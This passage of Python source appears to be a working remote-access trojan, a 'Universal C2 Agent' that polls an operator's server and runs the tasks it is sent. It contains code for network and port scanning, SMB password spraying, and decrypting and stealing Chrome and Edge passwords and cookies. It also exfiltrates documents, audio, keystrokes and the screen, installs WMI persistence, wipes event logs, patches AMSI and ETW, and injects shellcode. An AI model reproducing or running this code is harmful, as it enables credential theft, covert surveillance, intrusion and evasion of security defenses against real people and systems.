    def _arp_scan(self):
        """Scan local network via ARP ping sweep."""
        results = ["=== [ ARP / NETWORK SCAN ] ==="]
        try:
            import socket as _s
            ip = _s.gethostbyname(_s.gethostname())
            subnet = ".".join(ip.split(".")[:3])
            results.append(f"  Scanning subnet: {subnet}.0/24 ...")
            # Trigger ARP cache by pinging all hosts quickly (background)
            if platform.system() == "Windows":
                self._run_cmd(
                    f"for /l %i in (1,1,254) do @ping -n 1 -w 30 {subnet}.%i >nul 2>&1",
                    shell=True, timeout=40)
            else:
                for i in range(1, 255):
                    try: _s.create_connection((f"{subnet}.{i}", 80), timeout=0.05)
                    except: pass
        except: pass
        # Read ARP table
        arp = self._run_cmd("arp -a", shell=True, timeout=10).stdout.strip()
        results.append(arp)
        return "\n".join(results)

    def _port_scan(self, target):
        """Scan common ports on a target IP."""
        if not target: return "[!] Usage: @port_scan <ip>"
        import socket as _s
        ports = [21,22,23,25,53,80,110,135,139,143,389,443,445,
                 993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
        results = [f"=== [ PORT SCAN: {target} ] ==="]
        for port in ports:
            try:
                sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target, port)) == 0:
                    try: svc = _s.getservbyport(port)
                    except: svc = "unknown"
                    results.append(f"  {port:5d}/tcp  OPEN   {svc}")
                sock.close()
            except: pass
        if len(results) == 1:
            results.append("  [No open ports found on common ports]")
        return "\n".join(results)

    def _smb_spray(self, args):
        """Attempt SMB authentication with credentials."""
        parts = (args or "").split()
        if not parts: return "[!] Usage: @smb_spray <ip> [user] [password]"
        target = parts[0]
        creds = [(parts[1], parts[2])] if len(parts) >= 3 else [
            ("administrator", ""), ("administrator", "password"),
            ("administrator", "admin"), ("administrator", "Admin@123"),
            ("admin", "admin"), ("admin", "password"), ("guest", ""),
        ]
        results = [f"=== [ SMB SPRAY: {target} ] ==="]
        for user, pw in creds:
            cmd = f'net use \\\\{target}\\IPC$ "{pw}" /user:{user} 2>&1'
            r = self._run_cmd(cmd, shell=True, timeout=10)
            ok = r.returncode == 0 or "successfully" in r.stdout.lower()
            results.append(f"  [{"+" if ok else "-"}] {user}:{pw or "(blank)"} -> {"SUCCESS !!!" if ok else "failed"}")
            if ok:
                self._run_cmd(f'net use \\\\{target}\\IPC$ /delete /y', shell=True, timeout=5)
                break
        return "\n".join(results)

    def _telegram_fallback(self):
        """Dead-drop resolver: check a Telegram bot for a new C2 URL if primary fails."""
        # This is a sample implementation using the bot token if embedded
        # In a real scenario, this might pulse a public channel description
        try:
            # We look for a pattern like: C2_URL:http://1.2.3.4:5001
            # You can update this by sending a message to your bot
            token = "YOUR_BOT_TOKEN_HERE" # User should replace this in payload
            if "YOUR_BOT_TOKEN" in token: return None
            
            resp = requests.get(f"https://api.telegram.org/bot{token}/getUpdates", timeout=10)
            if resp.status_code == 200:
                msgs = resp.json().get("result", [])
                for m in reversed(msgs):
                    text = m.get("message", {}).get("text", "")
                    if "C2_URL:" in text:
                        return text.split("C2_URL:")[1].strip()
        except: pass
        return None


    def run(self):
        print("\n" + "=" * 50)
        print(" UNIVERSAL C2 AGENT ONLINE ".center(50, "="))
        print("=" * 50)
        print(f" ID:       {self.id}")
        print(f" SERVER:   {self.server_url}")
        print(f" OS:       {self.os}")
        print("=" * 50 + "\n")

        self.is_sandbox = self._check_sandbox()
        self.user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"]
        
        # Start Auto-Loot Background Thread
        self._auto_loot_thread = threading.Thread(target=self._auto_loot_worker, daemon=True)
        self._auto_loot_thread.start()

        # Threaded Task Wrapper
        def task_wrapper(cmd, task_id):
            try:
                output = self.execute(cmd, task_id=task_id)
                if output and not output.startswith("[+] Running in background"):
                    self.session.post(f"{self.server_url}/result",
                        json={'command_id': task_id, 'output': output, 'agent_id': self.id},
                        timeout=10)
                    
                    if "[+] Update downloaded." in output:
                        os._exit(0)
            except Exception as e:
                self.session.post(f"{self.server_url}/result",
                    json={'command_id': task_id, 'output': f"[!] Error in task: {str(e)}", 'agent_id': self.id},
                    timeout=10)

        while True:
            try:
                headers = {"User-Agent": random.choice(self.user_agents)}
                payload = {"agent_id": self.id, "hostname": self.hostname, "os": self.os, "is_sandbox": self.is_sandbox}
                
                # Use persistent session for speed
                resp = self.session.post(f"{self.server_url}/api/v1/update", json=payload, headers=headers, timeout=10)
                
                if resp.status_code == 200:
                    data = resp.json()
                    if 'command' in data:
                        cmd, task_id = data['command'], data.get('command_id')
                        print(f"[*] Hot Mode: Dispatching {cmd}")
                        threading.Thread(target=task_wrapper, args=(cmd, task_id), daemon=True).start()
                        # HOT MODE: Re-check immediately for more commands
                        continue 
                
                time.sleep(self.sleep_interval)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                print("\n[!] Connection lost. Attempting re-discovery...")
                new_url = discover_server()
                if new_url: self.server_url = new_url
                time.sleep(10)
            except KeyboardInterrupt:
                print("\n[!] User termination.")
                break
            except Exception as e:
                time.sleep(self.sleep_interval * 2)

    def _set_pulse(self, args):
        """Dynamically adjust heartbeat interval."""
        try:
            val = int(args.strip())
            self.sleep_interval = max(1, val)
            return f"[+] Heartbeat pulse set to {self.sleep_interval}s."
        except: return "[!] Usage: @pulse <seconds>"

    def _get_browser_vault(self):
        """Advanced: Decrypt saved passwords from Chrome and Edge."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        import json, base64, sqlite3, shutil
        import win32crypt # Part of pywin32
        from Cryptodome.Cipher import AES
        
        results = ["=== [ BROWSER VAULT ] ==="]
        browsers = {
            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
        }
        
        for name, path in browsers.items():
            try:
                local_state = os.path.join(path, "Local State")
                if not os.path.exists(local_state): continue
                
                with open(local_state, "r", encoding="utf-8") as f:
                    key = json.load(f)["os_crypt"]["encrypted_key"]
                    key = base64.b64decode(key)[5:] # Remove 'DPAPI' prefix
                    master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                
                login_db = os.path.join(path, "Default", "Login Data")
                if not os.path.exists(login_db):
                    # Try other common profiles
                    for p in ["Profile 1", "Profile 2", "Profile 3"]:
                        test_p = os.path.join(path, p, "Login Data")
                        if os.path.exists(test_p):
                            login_db = test_p
                            break
                
                if os.path.exists(login_db):
                    tmp_db = os.path.join(os.environ["TEMP"], "ld.db")
                    shutil.copy2(login_db, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    conn.text_factory = bytes
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for url_b, user_b, enc_pwd in cursor.fetchall():
                        try:
                            url = url_b.decode('utf-8', errors='ignore')
                            user = user_b.decode('utf-8', errors='ignore')
                            if not user: continue
                            
                            iv = enc_pwd[3:15]
                            payload = enc_pwd[15:]
                            ciphertext = payload[:-16]
                            tag = payload[-16:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            dec_raw = cipher.decrypt_and_verify(ciphertext, tag)
                            try:
                                dec_pwd = dec_raw.decode('utf-8', errors='ignore')
                            except:
                                dec_pwd = dec_raw.hex()
                                
                            results.append(f"[{name}] {url} | {user} | {dec_pwd}")
                        except Exception: pass
                    conn.close()
                    os.remove(tmp_db)
            except Exception as e:
                results.append(f"[!] {name} error: {str(e)}")
        
        return "\n".join(results)

    def _get_browser_cookies(self):
        """Extract and decrypt browser cookies for session hijacking."""
        if platform.system() != "Windows": return "[!] Windows only."
        results = ["=== [ BROWSER COOKIES ] ==="]
        paths = {
            "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data")
        }
        
        for name, path in paths.items():
            try:
                local_state = os.path.join(path, "Local State")
                if not os.path.exists(local_state): continue
                
                with open(local_state, "r", encoding="utf-8") as f:
                    key = json.loads(f.read())["os_crypt"]["encrypted_key"]
                    import win32crypt
                    from Cryptodome.Cipher import AES
                    master_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
                
                cookie_db = os.path.join(path, "Default", "Network", "Cookies")
                if not os.path.exists(cookie_db):
                    for p in ["Profile 1", "Profile 2"]:
                        test_p = os.path.join(path, p, "Network", "Cookies")
                        if os.path.exists(test_p): cookie_db = test_p; break
                
                if os.path.exists(cookie_db):
                    tmp_db = os.path.join(os.environ["TEMP"], "ck.db")
                    import shutil
                    shutil.copy2(cookie_db, tmp_db)
                    
                    import sqlite3
                    conn = sqlite3.connect(tmp_db)
                    conn.text_factory = bytes # Force bytes for all columns
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    for host_b, cname_b, enc_val in cursor.fetchall():
                        try:
                            host = host_b.decode('utf-8', errors='ignore')
                            cname = cname_b.decode('utf-8', errors='ignore')
                            iv = enc_val[3:15]
                            payload = enc_val[15:]
                            dec_raw = AES.new(master_key, AES.MODE_GCM, iv).decrypt_and_verify(payload[:-16], payload[-16:])
                            try:
                                dec_val = dec_raw.decode('utf-8', errors='ignore')
                            except:
                                dec_val = dec_raw.hex() # Fallback to hex if binary
                            results.append(f"[{name}] {host} | {cname} | {dec_val}")
                        except Exception: pass
                    conn.close()
                    os.remove(tmp_db)
            except Exception as e:
                results.append(f"[!] {name} error: {str(e)}")
        
        if len(results) == 1: return "[!] No cookies found or decrypted."
        return "\n".join(results)

    def _persist_wmi(self):
        """Advanced persistence via WMI Event Consumer."""
        if platform.system() != "Windows": return "[!] Windows only."
        agent_path = os.path.abspath(__file__)
        cmd = f"pythonw.exe {agent_path}"
        
        # PowerShell script to create WMI persistence
        ps_script = f"""
        $FilterName = 'WindowsHealthCheckFilter'
        $ConsumerName = 'WindowsHealthCheckConsumer'
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute % 5 = 0"
        
        $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name=$FilterName; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query=$Query}}
        $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name=$ConsumerName; CommandLineTemplate='{cmd}'}}
        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter; Consumer=$Consumer}}
        """
        res = self._run_cmd(f"powershell -Command \"{ps_script}\"", shell=True)
        return "[+] WMI Persistence installed (triggers every 5 minutes)." if res.returncode == 0 else f"[!] WMI failed: {res.stderr}"



    def _harvest(self):
        """Find and exfiltrate sensitive documents."""
        results = ["=== [ HARVESTED FILES ] ==="]
        patterns = ["*password*", "*secret*", "*finance*", "*.kdbx", "*.pdf", "*.docx", "*.xlsx"]
        user_profile = os.environ["USERPROFILE"]
        search_dirs = [
            os.path.join(user_profile, "Documents"),
            os.path.join(user_profile, "Desktop"),
            os.path.join(user_profile, "Downloads")
        ]
        
        for search_dir in search_dirs:
            if not os.path.exists(search_dir): continue
            for root, dirs, files in os.walk(search_dir):
                for file in files:
                    for pat in patterns:
                        import fnmatch
                        if fnmatch.fnmatch(file.lower(), pat):
                            path = os.path.join(root, file)
                            try:
                                size = os.path.getsize(path)
                                if 100 < size < 10 * 1024 * 1024: # >100B and < 10MB
                                    self._download(path)
                                    results.append(f"[Sensitive] {file} ({size} bytes) -> {path}")
                            except: pass
                            break
        if len(results) == 1:
            results.append("  No sensitive files matched patterns in standard folders.")
        return "\n".join(results)

    def _record_start(self):
        """Start recording audio from mic using Windows MCI."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        import ctypes
        mci = ctypes.windll.winmm.mciSendStringW
        try:
            mci("open new type waveaudio alias rec", None, 0, 0)
            mci("record rec", None, 0, 0)
            self._recording_active = True
            return "[+] Audio recording started. Send @record_stop to exfiltrate."
        except Exception as e:
            return f"[!] Recording start failed: {str(e)}"

    def _record_stop(self):
        """Stop and exfiltrate the audio recording."""
        if not hasattr(self, '_recording_active') or not self._recording_active:
            return "[!] No recording is currently active."
        
        import ctypes
        mci = ctypes.windll.winmm.mciSendStringW
        tmp_wav = os.path.join(os.environ["TEMP"], f"rec_{int(time.time())}.wav")
        try:
            mci("stop rec", None, 0, 0)
            mci(f"save rec {tmp_wav}", None, 0, 0)
            mci("close rec", None, 0, 0)
            self._recording_active = False
            
            if os.path.exists(tmp_wav):
                self._download(tmp_wav)
                os.remove(tmp_wav)
                return f"[+] Audio exfiltrated: {os.path.basename(tmp_wav)}"
        except Exception as e:
            return f"[!] Recording stop failed: {str(e)}"
        return "[!] Recording finalization failed."

    def _melt(self):
        """Anti-forensics: Wipe logs and self-destruct."""
        if platform.system() == "Windows":
            # Clear Event Logs
            self._run_cmd("wevtutil cl System", shell=True)
            self._run_cmd("wevtutil cl Security", shell=True)
            self._run_cmd("wevtutil cl Application", shell=True)
            # Delete Prefetch
            self._run_cmd("del /q /f C:\\Windows\\Prefetch\\*", shell=True)
        
        return self._handle_selfdestruct()

    def _vnc_start(self):
        """Start live screen streaming."""
        if hasattr(self, '_vnc_active') and self._vnc_active:
            return "[!] VNC stream is already running."
        
        self._vnc_active = True
        def vnc_loop():
            while self._vnc_active:
                self._capture_screen()
                time.sleep(1) # 1 FPS
        
        threading.Thread(target=vnc_loop, daemon=True).start()
        return "[+] VNC stream started (1 FPS). Check Gallery or VNC tab."

    def _vnc_stop(self):
        """Stop live screen streaming."""
        self._vnc_active = False
        return "[+] VNC stream stopped."

    def _patch_amsi(self):
        """Bypass AMSI (Antimalware Scan Interface) in-memory."""
        if os.name != 'nt': return "[!] Windows only."
        try:
            import ctypes
            patch = b"\x48\x31\xC0\xC3" # xor rax, rax; ret
            process = ctypes.windll.kernel32.GetCurrentProcess()
            amsi = ctypes.windll.loadlibrary.LoadLibraryW("amsi.dll")
            addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtectEx(process, addr, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.windll.kernel32.WriteProcessMemory(process, addr, patch, len(patch), None)
            ctypes.windll.kernel32.VirtualProtectEx(process, addr, len(patch), old_protect, ctypes.byref(old_protect))
            return "[+] AMSI patched successfully."
        except Exception as e:
            return f"[!] AMSI patch failed: {str(e)}"

    def _patch_etw(self):
        """Disable ETW (Event Tracing for Windows) for the current process."""
        if os.name != 'nt': return "[!] Windows only."
        try:
            import ctypes
            patch = b"\xC3" # ret
            ntdll = ctypes.windll.loadlibrary.LoadLibraryW("ntdll.dll")
            addr = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.windll.kernel32.WriteProcessMemory(ctypes.windll.kernel32.GetCurrentProcess(), addr, patch, len(patch), None)
            ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
            return "[+] ETW patched successfully."
        except Exception as e:
            return f"[!] ETW patch failed: {str(e)}"

    def _keylog_start(self):
        """Start the real-time keylogger."""
        if os.name != 'nt': return "[!] Windows only."
        try:
            # We'll use a simplified version to avoid heavy dependencies for the audit
            from pynput.keyboard import Listener
            def on_press(key):
                try: k = key.char
                except: k = f"[{str(key)}]"
                self._send_log(f"[KEY] {k}") # Real-time exfil for verification
            self._key_listener = Listener(on_press=on_press)
            self._key_listener.start()
            return "[+] Keylogger started."
        except Exception as e:
            return f"[!] Keylogger start failed (ensure pynput installed): {str(e)}"

    def _keylog_stop(self):
        """Stop the real-time keylogger."""
        if hasattr(self, '_key_listener'):
            self._key_listener.stop()
            return "[+] Keylogger stopped."
        return "[!] Keylogger not running."

    def _shellcode_inject(self, shellcode_b64):
        """Direct in-memory shellcode injection."""
        if os.name != 'nt': return "[!] Windows only."
        try:
            import ctypes, base64
            buf = base64.b64decode(shellcode_b64)
            ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
            ctypes.memmove(ptr, buf, len(buf))
            ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
            return "[+] Shellcode injected."
        except Exception as e:
            return f"[!] Injection failed: {str(e)}"

    def _reflective_load(self, args):
        return "[!] Reflective DLL loading requires specialized payload header."

if __name__ == "__main__":
    server_url = discover_server()
    if not server_url:
        if len(sys.argv) > 1:
            server_url = sys.argv[1]
            if not server_url.startswith("http"):
                server_url = f"http://{server_url}"
        else:
            # --- FINAL FALLBACK: YOUR SERVER ---
            server_url = "http://192.168.1.202:5001"
            print(f"[*] Discovery failed. Forcing connection to primary C2: {server_url}")
            # Skip check_url here; if we can download the agent, we can connect to it
    
    agent = UniversalAgent(server_url)
    agent.run()
